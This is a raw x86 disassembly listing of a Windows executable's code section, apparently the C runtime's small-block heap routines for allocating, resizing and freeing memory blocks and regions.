  424feb:	push   DWORD PTR ds:0x463320
  424ff1:	call   DWORD PTR ds:0x4280c4
  424ff7:	mov    eax,ds:0x4630dc
  424ffc:	mov    edx,DWORD PTR ds:0x4630e0
  425002:	lea    eax,[eax+eax*4]
  425005:	shl    eax,0x2
  425008:	mov    ecx,eax
  42500a:	mov    eax,ds:0x4630d8
  42500f:	sub    ecx,eax
  425011:	lea    ecx,[ecx+edx*1-0x14]
  425015:	push   ecx
  425016:	lea    ecx,[eax+0x14]
  425019:	push   ecx
  42501a:	push   eax
  42501b:	call   0x426870
  425020:	mov    eax,DWORD PTR [ebp+0x8]
  425023:	add    esp,0xc
  425026:	dec    DWORD PTR ds:0x4630dc
  42502c:	cmp    eax,DWORD PTR ds:0x4630d8
  425032:	jbe    0x425038
  425034:	sub    DWORD PTR [ebp+0x8],0x14
  425038:	mov    eax,ds:0x4630e0
  42503d:	mov    ds:0x4630e8,eax
  425042:	mov    eax,DWORD PTR [ebp+0x8]
  425045:	mov    ds:0x4630d8,eax
  42504a:	mov    DWORD PTR ds:0x4630f0,edi
  425050:	pop    ebx
  425051:	pop    edi
  425052:	pop    esi
  425053:	leave  
  425054:	ret    
  425055:	mov    eax,ds:0x4630dc
  42505a:	mov    ecx,DWORD PTR ds:0x4630ec
  425060:	push   edi
  425061:	xor    edi,edi
  425063:	cmp    eax,ecx
  425065:	jne    0x42509b
  425067:	lea    eax,[ecx+ecx*4+0x50]
  42506b:	shl    eax,0x2
  42506e:	push   eax
  42506f:	push   DWORD PTR ds:0x4630e0
  425075:	push   edi
  425076:	push   DWORD PTR ds:0x463320
  42507c:	call   DWORD PTR ds:0x4280ec
  425082:	cmp    eax,edi
  425084:	jne    0x42508a
  425086:	xor    eax,eax
  425088:	pop    edi
  425089:	ret    
  42508a:	add    DWORD PTR ds:0x4630ec,0x10
  425091:	mov    ds:0x4630e0,eax
  425096:	mov    eax,ds:0x4630dc
  42509b:	mov    ecx,DWORD PTR ds:0x4630e0
  4250a1:	push   esi
  4250a2:	push   0x41c4
  4250a7:	push   0x8
  4250a9:	push   DWORD PTR ds:0x463320
  4250af:	lea    eax,[eax+eax*4]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	call   DWORD PTR ds:0x4280e0
  4250bb:	cmp    eax,edi
  4250bd:	mov    DWORD PTR [esi+0x10],eax
  4250c0:	jne    0x4250c6
  4250c2:	xor    eax,eax
  4250c4:	jmp    0x425109
  4250c6:	push   0x4
  4250c8:	push   0x2000
  4250cd:	push   0x100000
  4250d2:	push   edi
  4250d3:	call   DWORD PTR ds:0x4280e8
  4250d9:	cmp    eax,edi
  4250db:	mov    DWORD PTR [esi+0xc],eax
  4250de:	jne    0x4250f2
  4250e0:	push   DWORD PTR [esi+0x10]
  4250e3:	push   edi
  4250e4:	push   DWORD PTR ds:0x463320
  4250ea:	call   DWORD PTR ds:0x4280c4
  4250f0:	jmp    0x4250c2
  4250f2:	or     DWORD PTR [esi+0x8],0xffffffff
  4250f6:	mov    DWORD PTR [esi],edi
  4250f8:	mov    DWORD PTR [esi+0x4],edi
  4250fb:	inc    DWORD PTR ds:0x4630dc
  425101:	mov    eax,DWORD PTR [esi+0x10]
  425104:	or     DWORD PTR [eax],0xffffffff
  425107:	mov    eax,esi
  425109:	pop    esi
  42510a:	pop    edi
  42510b:	ret    
  42510c:	push   ebp
  42510d:	mov    ebp,esp
  42510f:	push   ecx
  425110:	push   ecx
  425111:	mov    ecx,DWORD PTR [ebp+0x8]
  425114:	mov    eax,DWORD PTR [ecx+0x8]
  425117:	push   ebx
  425118:	push   esi
  425119:	mov    esi,DWORD PTR [ecx+0x10]
  42511c:	push   edi
  42511d:	xor    ebx,ebx
  42511f:	jmp    0x425124
  425121:	shl    eax,1
  425123:	inc    ebx
  425124:	test   eax,eax
  425126:	jge    0x425121
  425128:	mov    eax,ebx
  42512a:	imul   eax,eax,0x204
  425130:	lea    eax,[eax+esi*1+0x144]
  425137:	push   0x3f
  425139:	mov    DWORD PTR [ebp-0x8],eax
  42513c:	pop    edx
  42513d:	mov    DWORD PTR [eax+0x8],eax
  425140:	mov    DWORD PTR [eax+0x4],eax
  425143:	add    eax,0x8
  425146:	dec    edx
  425147:	jne    0x42513d
  425149:	push   0x4
  42514b:	mov    edi,ebx
  42514d:	push   0x1000
  425152:	shl    edi,0xf
  425155:	add    edi,DWORD PTR [ecx+0xc]
  425158:	push   0x8000
  42515d:	push   edi
  42515e:	call   DWORD PTR ds:0x4280e8
  425164:	test   eax,eax
  425166:	jne    0x425170
  425168:	or     eax,0xffffffff
  42516b:	jmp    0x42520d
  425170:	lea    edx,[edi+0x7000]
  425176:	cmp    edi,edx
  425178:	mov    DWORD PTR [ebp-0x4],edx
  42517b:	ja     0x4251c0
  42517d:	mov    ecx,edx
  42517f:	sub    ecx,edi
  425181:	shr    ecx,0xc
  425184:	lea    eax,[edi+0x10]
  425187:	inc    ecx
  425188:	or     DWORD PTR [eax-0x8],0xffffffff
  42518c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425193:	lea    edx,[eax+0xffc]
  425199:	mov    DWORD PTR [eax],edx
  42519b:	lea    edx,[eax-0x1004]
  4251a1:	mov    DWORD PTR [eax-0x4],0xff0
  4251a8:	mov    DWORD PTR [eax+0x4],edx
  4251ab:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251b5:	add    eax,0x1000
  4251ba:	dec    ecx
  4251bb:	jne    0x425188
  4251bd:	mov    edx,DWORD PTR [ebp-0x4]
  4251c0:	mov    eax,DWORD PTR [ebp-0x8]
  4251c3:	add    eax,0x1f8
  4251c8:	lea    ecx,[edi+0xc]
  4251cb:	mov    DWORD PTR [eax+0x4],ecx
  4251ce:	mov    DWORD PTR [ecx+0x8],eax
  4251d1:	lea    ecx,[edx+0xc]
  4251d4:	mov    DWORD PTR [eax+0x8],ecx
  4251d7:	mov    DWORD PTR [ecx+0x4],eax
  4251da:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251df:	xor    edi,edi
  4251e1:	inc    edi
  4251e2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  4251e9:	mov    al,BYTE PTR [esi+0x43]
  4251ec:	mov    cl,al
  4251ee:	inc    cl
  4251f0:	test   al,al
  4251f2:	mov    eax,DWORD PTR [ebp+0x8]
  4251f5:	mov    BYTE PTR [esi+0x43],cl
  4251f8:	jne    0x4251fd
  4251fa:	or     DWORD PTR [eax+0x4],edi
  4251fd:	mov    edx,0x80000000
  425202:	mov    ecx,ebx
  425204:	shr    edx,cl
  425206:	not    edx
  425208:	and    DWORD PTR [eax+0x8],edx
  42520b:	mov    eax,ebx
  42520d:	pop    edi
  42520e:	pop    esi
  42520f:	pop    ebx
  425210:	leave  
  425211:	ret    
  425212:	push   ebp
  425213:	mov    ebp,esp
  425215:	sub    esp,0xc
  425218:	mov    ecx,DWORD PTR [ebp+0x8]
  42521b:	mov    eax,DWORD PTR [ecx+0x10]
  42521e:	push   ebx
  42521f:	push   esi
  425220:	mov    esi,DWORD PTR [ebp+0x10]
  425223:	push   edi
  425224:	mov    edi,DWORD PTR [ebp+0xc]
  425227:	mov    edx,edi
  425229:	sub    edx,DWORD PTR [ecx+0xc]
  42522c:	add    esi,0x17
  42522f:	shr    edx,0xf
  425232:	mov    ecx,edx
  425234:	imul   ecx,ecx,0x204
  42523a:	lea    ecx,[ecx+eax*1+0x144]
  425241:	mov    DWORD PTR [ebp-0xc],ecx
  425244:	mov    ecx,DWORD PTR [edi-0x4]
  425247:	and    esi,0xfffffff0
  42524a:	dec    ecx
  42524b:	cmp    esi,ecx
  42524d:	lea    edi,[ecx+edi*1-0x4]
  425251:	mov    ebx,DWORD PTR [edi]
  425253:	mov    DWORD PTR [ebp+0x10],ecx
  425256:	mov    DWORD PTR [ebp-0x4],ebx
  425259:	jle    0x4253b4
  42525f:	test   bl,0x1
  425262:	jne    0x4253ad
  425268:	add    ebx,ecx
  42526a:	cmp    esi,ebx
  42526c:	jg     0x4253ad
  425272:	mov    ecx,DWORD PTR [ebp-0x4]
  425275:	sar    ecx,0x4
  425278:	dec    ecx
  425279:	cmp    ecx,0x3f
  42527c:	mov    DWORD PTR [ebp-0x8],ecx
  42527f:	jbe    0x425287
  425281:	push   0x3f
  425283:	pop    ecx
  425284:	mov    DWORD PTR [ebp-0x8],ecx
  425287:	mov    ebx,DWORD PTR [edi+0x4]
  42528a:	cmp    ebx,DWORD PTR [edi+0x8]
  42528d:	jne    0x4252d2
  42528f:	cmp    ecx,0x20
  425292:	mov    ebx,0x80000000
  425297:	jae    0x4252b3
  425299:	shr    ebx,cl
  42529b:	mov    ecx,DWORD PTR [ebp-0x8]
  42529e:	lea    ecx,[ecx+eax*1+0x4]
  4252a2:	not    ebx
  4252a4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252a8:	dec    BYTE PTR [ecx]
  4252aa:	jne    0x4252d2
  4252ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4252af:	and    DWORD PTR [ecx],ebx
  4252b1:	jmp    0x4252d2
  4252b3:	add    ecx,0xffffffe0
  4252b6:	shr    ebx,cl
  4252b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252bb:	lea    ecx,[ecx+eax*1+0x4]
  4252bf:	not    ebx
  4252c1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252c8:	dec    BYTE PTR [ecx]
  4252ca:	jne    0x4252d2
  4252cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252cf:	and    DWORD PTR [ecx+0x4],ebx
  4252d2:	mov    ecx,DWORD PTR [edi+0x8]
  4252d5:	mov    ebx,DWORD PTR [edi+0x4]
  4252d8:	mov    DWORD PTR [ecx+0x4],ebx
  4252db:	mov    ecx,DWORD PTR [edi+0x4]
  4252de:	mov    edi,DWORD PTR [edi+0x8]
  4252e1:	mov    DWORD PTR [ecx+0x8],edi
  4252e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4252e7:	sub    ecx,esi
  4252e9:	add    DWORD PTR [ebp-0x4],ecx
  4252ec:	cmp    DWORD PTR [ebp-0x4],0x0
  4252f0:	jle    0x42539b
  4252f6:	mov    edi,DWORD PTR [ebp-0x4]
  4252f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4252fc:	sar    edi,0x4
  4252ff:	dec    edi
  425300:	cmp    edi,0x3f
  425303:	lea    ecx,[ecx+esi*1-0x4]
  425307:	jbe    0x42530c
  425309:	push   0x3f
  42530b:	pop    edi
  42530c:	mov    ebx,DWORD PTR [ebp-0xc]
  42530f:	lea    ebx,[ebx+edi*8]
  425312:	mov    DWORD PTR [ebp+0x10],ebx
  425315:	mov    ebx,DWORD PTR [ebx+0x4]
  425318:	mov    DWORD PTR [ecx+0x4],ebx
  42531b:	mov    ebx,DWORD PTR [ebp+0x10]
  42531e:	mov    DWORD PTR [ecx+0x8],ebx
  425321:	mov    DWORD PTR [ebx+0x4],ecx
  425324:	mov    ebx,DWORD PTR [ecx+0x4]
  425327:	mov    DWORD PTR [ebx+0x8],ecx
  42532a:	mov    ebx,DWORD PTR [ecx+0x4]
  42532d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425330:	jne    0x425389
  425332:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425336:	mov    BYTE PTR [ebp+0x13],cl
  425339:	inc    cl
  42533b:	cmp    edi,0x20
  42533e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425342:	jae    0x425360
  425344:	cmp    BYTE PTR [ebp+0x13],0x0
  425348:	jne    0x425358
  42534a:	mov    ecx,edi
  42534c:	mov    ebx,0x80000000
  425351:	shr    ebx,cl
  425353:	mov    ecx,DWORD PTR [ebp+0x8]
  425356:	or     DWORD PTR [ecx],ebx
  425358:	lea    eax,[eax+edx*4+0x44]
  42535c:	mov    ecx,edi
  42535e:	jmp    0x425380
  425360:	cmp    BYTE PTR [ebp+0x13],0x0
  425364:	jne    0x425376
  425366:	lea    ecx,[edi-0x20]
  425369:	mov    ebx,0x80000000
  42536e:	shr    ebx,cl
  425370:	mov    ecx,DWORD PTR [ebp+0x8]
  425373:	or     DWORD PTR [ecx+0x4],ebx
  425376:	lea    eax,[eax+edx*4+0xc4]
  42537d:	lea    ecx,[edi-0x20]
  425380:	mov    edx,0x80000000
  425385:	shr    edx,cl
  425387:	or     DWORD PTR [eax],edx
  425389:	mov    edx,DWORD PTR [ebp+0xc]
  42538c:	mov    ecx,DWORD PTR [ebp-0x4]
  42538f:	lea    eax,[edx+esi*1-0x4]
  425393:	mov    DWORD PTR [eax],ecx
  425395:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425399:	jmp    0x42539e
  42539b:	mov    edx,DWORD PTR [ebp+0xc]
  42539e:	lea    eax,[esi+0x1]
  4253a1:	mov    DWORD PTR [edx-0x4],eax
  4253a4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253a8:	jmp    0x4254e9
  4253ad:	xor    eax,eax
  4253af:	jmp    0x4254ec
  4253b4:	jge    0x4254e9
  4253ba:	mov    ebx,DWORD PTR [ebp+0xc]
  4253bd:	sub    DWORD PTR [ebp+0x10],esi
  4253c0:	lea    ecx,[esi+0x1]
  4253c3:	mov    DWORD PTR [ebx-0x4],ecx
  4253c6:	lea    ebx,[ebx+esi*1-0x4]
  4253ca:	mov    esi,DWORD PTR [ebp+0x10]
  4253cd:	sar    esi,0x4
  4253d0:	dec    esi
  4253d1:	cmp    esi,0x3f
  4253d4:	mov    DWORD PTR [ebp+0xc],ebx
  4253d7:	mov    DWORD PTR [ebx-0x4],ecx
  4253da:	jbe    0x4253df
  4253dc:	push   0x3f
  4253de:	pop    esi
  4253df:	test   BYTE PTR [ebp-0x4],0x1
  4253e3:	jne    0x425469
  4253e9:	mov    esi,DWORD PTR [ebp-0x4]
  4253ec:	sar    esi,0x4
  4253ef:	dec    esi
  4253f0:	cmp    esi,0x3f
  4253f3:	jbe    0x4253f8
  4253f5:	push   0x3f
  4253f7:	pop    esi
  4253f8:	mov    ecx,DWORD PTR [edi+0x4]
  4253fb:	cmp    ecx,DWORD PTR [edi+0x8]
  4253fe:	jne    0x425442
  425400:	cmp    esi,0x20
  425403:	mov    ebx,0x80000000
  425408:	jae    0x425423
  42540a:	mov    ecx,esi
  42540c:	shr    ebx,cl
  42540e:	lea    esi,[esi+eax*1+0x4]
  425412:	not    ebx
  425414:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425418:	dec    BYTE PTR [esi]
  42541a:	jne    0x42543f
  42541c:	mov    ecx,DWORD PTR [ebp+0x8]
  42541f:	and    DWORD PTR [ecx],ebx
  425421:	jmp    0x42543f
  425423:	lea    ecx,[esi-0x20]
  425426:	shr    ebx,cl
  425428:	lea    ecx,[esi+eax*1+0x4]
  42542c:	not    ebx
  42542e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425435:	dec    BYTE PTR [ecx]
  425437:	jne    0x42543f
  425439:	mov    ecx,DWORD PTR [ebp+0x8]
  42543c:	and    DWORD PTR [ecx+0x4],ebx
  42543f:	mov    ebx,DWORD PTR [ebp+0xc]
  425442:	mov    ecx,DWORD PTR [edi+0x8]
  425445:	mov    esi,DWORD PTR [edi+0x4]
  425448:	mov    DWORD PTR [ecx+0x4],esi
  42544b:	mov    esi,DWORD PTR [edi+0x8]
  42544e:	mov    ecx,DWORD PTR [edi+0x4]
  425451:	mov    DWORD PTR [ecx+0x8],esi
  425454:	mov    esi,DWORD PTR [ebp+0x10]
  425457:	add    esi,DWORD PTR [ebp-0x4]
  42545a:	mov    DWORD PTR [ebp+0x10],esi
  42545d:	sar    esi,0x4
  425460:	dec    esi
  425461:	cmp    esi,0x3f
  425464:	jbe    0x425469
  425466:	push   0x3f
  425468:	pop    esi
  425469:	mov    ecx,DWORD PTR [ebp-0xc]
  42546c:	lea    ecx,[ecx+esi*8]
  42546f:	mov    edi,DWORD PTR [ecx+0x4]
  425472:	mov    DWORD PTR [ebx+0x8],ecx
  425475:	mov    DWORD PTR [ebx+0x4],edi
  425478:	mov    DWORD PTR [ecx+0x4],ebx
  42547b:	mov    ecx,DWORD PTR [ebx+0x4]
  42547e:	mov    DWORD PTR [ecx+0x8],ebx
  425481:	mov    ecx,DWORD PTR [ebx+0x4]
  425484:	cmp    ecx,DWORD PTR [ebx+0x8]
  425487:	jne    0x4254e0
  425489:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42548d:	mov    BYTE PTR [ebp+0xf],cl
  425490:	inc    cl
  425492:	cmp    esi,0x20
  425495:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425499:	jae    0x4254b7
  42549b:	cmp    BYTE PTR [ebp+0xf],0x0
  42549f:	jne    0x4254af
  4254a1:	mov    ecx,esi
  4254a3:	mov    edi,0x80000000
  4254a8:	shr    edi,cl
  4254aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ad:	or     DWORD PTR [ecx],edi
  4254af:	lea    eax,[eax+edx*4+0x44]
  4254b3:	mov    ecx,esi
  4254b5:	jmp    0x4254d7
  4254b7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254bb:	jne    0x4254cd
  4254bd:	lea    ecx,[esi-0x20]
  4254c0:	mov    edi,0x80000000
  4254c5:	shr    edi,cl
  4254c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254ca:	or     DWORD PTR [ecx+0x4],edi
  4254cd:	lea    eax,[eax+edx*4+0xc4]
  4254d4:	lea    ecx,[esi-0x20]
  4254d7:	mov    edx,0x80000000
  4254dc:	shr    edx,cl
  4254de:	or     DWORD PTR [eax],edx
  4254e0:	mov    eax,DWORD PTR [ebp+0x10]
  4254e3:	mov    DWORD PTR [ebx],eax
  4254e5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  4254e9:	xor    eax,eax
  4254eb:	inc    eax
  4254ec:	pop    edi
  4254ed:	pop    esi
  4254ee:	pop    ebx
  4254ef:	leave  
  4254f0:	ret    
  4254f1:	push   ebp
  4254f2:	mov    ebp,esp
  4254f4:	sub    esp,0x14
  4254f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254fa:	mov    eax,ds:0x4630dc
  4254ff:	mov    edx,DWORD PTR ds:0x4630e0
  425505:	add    ecx,0x17
  425508:	and    ecx,0xfffffff0
  42550b:	push   ebx
  42550c:	mov    DWORD PTR [ebp-0x10],ecx
  42550f:	sar    ecx,0x4
  425512:	push   esi
  425513:	lea    eax,[eax+eax*4]
  425516:	push   edi
  425517:	dec    ecx
  425518:	cmp    ecx,0x20
  42551b:	lea    edi,[edx+eax*4]
  42551e:	mov    DWORD PTR [ebp-0x4],edi
  425521:	jge    0x42552e
  425523:	or     esi,0xffffffff
  425526:	shr    esi,cl
  425528:	or     DWORD PTR [ebp-0x8],0xffffffff
  42552c:	jmp    0x42553b
  42552e:	add    ecx,0xffffffe0
  425531:	or     eax,0xffffffff
  425534:	xor    esi,esi
  425536:	shr    eax,cl
  425538:	mov    DWORD PTR [ebp-0x8],eax
  42553b:	mov    eax,ds:0x4630e8
  425540:	mov    ebx,eax
  425542:	mov    DWORD PTR [ebp-0xc],esi
  425545:	cmp    ebx,edi
  425547:	jmp    0x42555d
  425549:	mov    ecx,DWORD PTR [ebx+0x4]
  42554c:	mov    edi,DWORD PTR [ebx]
  42554e:	and    ecx,DWORD PTR [ebp-0x8]
  425551:	and    edi,esi
  425553:	or     ecx,edi
  425555:	jne    0x425562
  425557:	add    ebx,0x14
  42555a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42555d:	mov    DWORD PTR [ebp+0x8],ebx
  425560:	jb     0x425549
  425562:	cmp    ebx,DWORD PTR [ebp-0x4]
  425565:	jne    0x42558b
  425567:	mov    ebx,edx
  425569:	jmp    0x42557c
  42556b:	mov    ecx,DWORD PTR [ebx+0x4]
  42556e:	mov    edi,DWORD PTR [ebx]
  425570:	and    ecx,DWORD PTR [ebp-0x8]
  425573:	and    edi,esi
  425575:	or     ecx,edi
  425577:	jne    0x425583
  425579:	add    ebx,0x14
  42557c:	cmp    ebx,eax
  42557e:	mov    DWORD PTR [ebp+0x8],ebx
  425581:	jb     0x42556b
  425583:	cmp    ebx,eax
  425585:	je     0x42561f
  42558b:	mov    DWORD PTR ds:0x4630e8,ebx
  425591:	mov    eax,DWORD PTR [ebx+0x10]
  425594:	mov    edx,DWORD PTR [eax]
  425596:	cmp    edx,0xffffffff
  425599:	mov    DWORD PTR [ebp-0x4],edx
  42559c:	je     0x4255b2
  42559e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255a5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255a9:	and    ecx,DWORD PTR [ebp-0x8]
  4255ac:	and    edi,esi
  4255ae:	or     ecx,edi
  4255b0:	jne    0x4255e8
  4255b2:	mov    edx,DWORD PTR [eax+0xc4]
  4255b8:	and    edx,DWORD PTR [ebp-0x8]
  4255bb:	and    DWORD PTR [ebp-0x4],0x0
  4255bf:	lea    ecx,[eax+0x44]
  4255c2:	mov    esi,DWORD PTR [ecx]
  4255c4:	and    esi,DWORD PTR [ebp-0xc]
  4255c7:	or     edx,esi
  4255c9:	mov    esi,DWORD PTR [ebp-0xc]
  4255cc:	jne    0x4255e5
  4255ce:	mov    edx,DWORD PTR [ecx+0x84]
  4255d4:	and    edx,DWORD PTR [ebp-0x8]
  4255d7:	inc    DWORD PTR [ebp-0x4]
  4255da:	add    ecx,0x4
  4255dd:	mov    edi,DWORD PTR [ecx]
  4255df:	and    edi,esi
  4255e1:	or     edx,edi
  4255e3:	je     0x4255ce
  4255e5:	mov    edx,DWORD PTR [ebp-0x4]
  4255e8:	mov    ecx,edx
  4255ea:	imul   ecx,ecx,0x204
  4255f0:	lea    ecx,[ecx+eax*1+0x144]
  4255f7:	mov    DWORD PTR [ebp-0xc],ecx
  4255fa:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  4255fe:	xor    edi,edi
  425600:	and    ecx,esi
  425602:	jne    0x425671
  425604:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42560b:	and    ecx,DWORD PTR [ebp-0x8]
  42560e:	push   0x20
  425610:	pop    edi
  425611:	jmp    0x425671
  425613:	cmp    DWORD PTR [ebx+0x8],0x0
  425617:	jne    0x425624
  425619:	add    ebx,0x14
  42561c:	mov    DWORD PTR [ebp+0x8],ebx
  42561f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425622:	jb     0x425613
  425624:	cmp    ebx,DWORD PTR [ebp-0x4]
  425627:	jne    0x42564f
  425629:	mov    ebx,edx
  42562b:	jmp    0x425636
  42562d:	cmp    DWORD PTR [ebx+0x8],0x0
  425631:	jne    0x42563d
  425633:	add    ebx,0x14
  425636:	cmp    ebx,eax
  425638:	mov    DWORD PTR [ebp+0x8],ebx
  42563b:	jb     0x42562d
  42563d:	cmp    ebx,eax
  42563f:	jne    0x42564f
  425641:	call   0x425055
  425646:	mov    ebx,eax
  425648:	test   ebx,ebx
  42564a:	mov    DWORD PTR [ebp+0x8],ebx
  42564d:	je     0x425667
  42564f:	push   ebx
  425650:	call   0x42510c
  425655:	pop    ecx
  425656:	mov    ecx,DWORD PTR [ebx+0x10]
  425659:	mov    DWORD PTR [ecx],eax
  42565b:	mov    eax,DWORD PTR [ebx+0x10]
  42565e:	cmp    DWORD PTR [eax],0xffffffff
  425661:	jne    0x42558b
  425667:	xor    eax,eax
  425669:	jmp    0x4257e8
  42566e:	shl    ecx,1
  425670:	inc    edi
  425671:	test   ecx,ecx
  425673:	jge    0x42566e
  425675:	mov    ecx,DWORD PTR [ebp-0xc]
  425678:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42567c:	mov    ecx,DWORD PTR [edx]
  42567e:	sub    ecx,DWORD PTR [ebp-0x10]
  425681:	mov    esi,ecx
  425683:	sar    esi,0x4
  425686:	dec    esi
  425687:	cmp    esi,0x3f
  42568a:	mov    DWORD PTR [ebp-0x8],ecx
  42568d:	jle    0x425692
  42568f:	push   0x3f
  425691:	pop    esi
  425692:	cmp    esi,edi
  425694:	je     0x42579b
  42569a:	mov    ecx,DWORD PTR [edx+0x4]
  42569d:	cmp    ecx,DWORD PTR [edx+0x8]
  4256a0:	jne    0x4256fe
  4256a2:	cmp    edi,0x20
  4256a5:	mov    ebx,0x80000000
  4256aa:	jge    0x4256d2
  4256ac:	mov    ecx,edi
  4256ae:	shr    ebx,cl
  4256b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b3:	lea    edi,[eax+edi*1+0x4]
  4256b7:	not    ebx
  4256b9:	mov    DWORD PTR [ebp-0x14],ebx
  4256bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256c4:	dec    BYTE PTR [edi]
  4256c6:	jne    0x4256fb
  4256c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256ce:	and    DWORD PTR [ebx],ecx
  4256d0:	jmp    0x4256fe
  4256d2:	lea    ecx,[edi-0x20]
  4256d5:	shr    ebx,cl
  4256d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256da:	lea    ecx,[eax+ecx*4+0xc4]
  4256e1:	lea    edi,[eax+edi*1+0x4]
  4256e5:	not    ebx
  4256e7:	and    DWORD PTR [ecx],ebx
  4256e9:	dec    BYTE PTR [edi]
  4256eb:	mov    DWORD PTR [ebp-0x14],ebx
  4256ee:	jne    0x4256fb
  4256f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4256f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4256f6:	and    DWORD PTR [ebx+0x4],ecx
  4256f9:	jmp    0x4256fe
  4256fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4256fe:	cmp    DWORD PTR [ebp-0x8],0x0
  425702:	mov    ecx,DWORD PTR [edx+0x8]
  425705:	mov    edi,DWORD PTR [edx+0x4]
  425708:	mov    DWORD PTR [ecx+0x4],edi
  42570b:	mov    ecx,DWORD PTR [edx+0x4]
  42570e:	mov    edi,DWORD PTR [edx+0x8]
  425711:	mov    DWORD PTR [ecx+0x8],edi
  425714:	je     0x4257a7
  42571a:	mov    ecx,DWORD PTR [ebp-0xc]
  42571d:	lea    ecx,[ecx+esi*8]
  425720:	mov    edi,DWORD PTR [ecx+0x4]
  425723:	mov    DWORD PTR [edx+0x8],ecx
  425726:	mov    DWORD PTR [edx+0x4],edi
  425729:	mov    DWORD PTR [ecx+0x4],edx
  42572c:	mov    ecx,DWORD PTR [edx+0x4]
  42572f:	mov    DWORD PTR [ecx+0x8],edx
  425732:	mov    ecx,DWORD PTR [edx+0x4]
  425735:	cmp    ecx,DWORD PTR [edx+0x8]
  425738:	jne    0x425798
  42573a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42573e:	mov    BYTE PTR [ebp+0xb],cl
  425741:	inc    cl
  425743:	cmp    esi,0x20
  425746:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42574a:	jge    0x42576f
  42574c:	cmp    BYTE PTR [ebp+0xb],0x0
  425750:	jne    0x42575d
  425752:	mov    edi,0x80000000
  425757:	mov    ecx,esi
  425759:	shr    edi,cl
  42575b:	or     DWORD PTR [ebx],edi
  42575d:	mov    ecx,esi
  42575f:	mov    edi,0x80000000
  425764:	shr    edi,cl
  425766:	mov    ecx,DWORD PTR [ebp-0x4]
  425769:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42576d:	jmp    0x425798
  42576f:	cmp    BYTE PTR [ebp+0xb],0x0
  425773:	jne    0x425782
  425775:	lea    ecx,[esi-0x20]
  425778:	mov    edi,0x80000000
  42577d:	shr    edi,cl
  42577f:	or     DWORD PTR [ebx+0x4],edi
  425782:	mov    ecx,DWORD PTR [ebp-0x4]
  425785:	lea    edi,[eax+ecx*4+0xc4]
  42578c:	lea    ecx,[esi-0x20]
  42578f:	mov    esi,0x80000000
  425794:	shr    esi,cl
  425796:	or     DWORD PTR [edi],esi
  425798:	mov    ecx,DWORD PTR [ebp-0x8]
  42579b:	test   ecx,ecx
  42579d:	je     0x4257aa
  42579f:	mov    DWORD PTR [edx],ecx
  4257a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257a5:	jmp    0x4257aa
  4257a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257aa:	mov    esi,DWORD PTR [ebp-0x10]
  4257ad:	add    edx,ecx
  4257af:	lea    ecx,[esi+0x1]
  4257b2:	mov    DWORD PTR [edx],ecx
  4257b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257b8:	mov    esi,DWORD PTR [ebp-0xc]
  4257bb:	mov    ecx,DWORD PTR [esi]
  4257bd:	test   ecx,ecx
  4257bf:	lea    edi,[ecx+0x1]
  4257c2:	mov    DWORD PTR [esi],edi
  4257c4:	jne    0x4257e0
  4257c6:	cmp    ebx,DWORD PTR ds:0x4630d8
  4257cc:	jne    0x4257e0
  4257ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4257d1:	cmp    ecx,DWORD PTR ds:0x4630f0
  4257d7:	jne    0x4257e0
  4257d9:	and    DWORD PTR ds:0x4630d8,0x0
  4257e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257e3:	mov    DWORD PTR [eax],ecx
  4257e5:	lea    eax,[edx+0x4]
  4257e8:	pop    edi
  4257e9:	pop    esi
  4257ea:	pop    ebx
  4257eb:	leave  
  4257ec:	ret    
  4257ed:	int3   
  4257ee:	int3   
  4257ef:	int3   
  4257f0:	push   esi
  4257f1:	inc    ebx
  4257f2:	xor    dh,BYTE PTR [eax]
  4257f4:	pop    eax
  4257f5:	inc    ebx
  4257f6:	xor    BYTE PTR [eax],dh
  4257f8:	push   ebp
  4257f9:	mov    ebp,esp
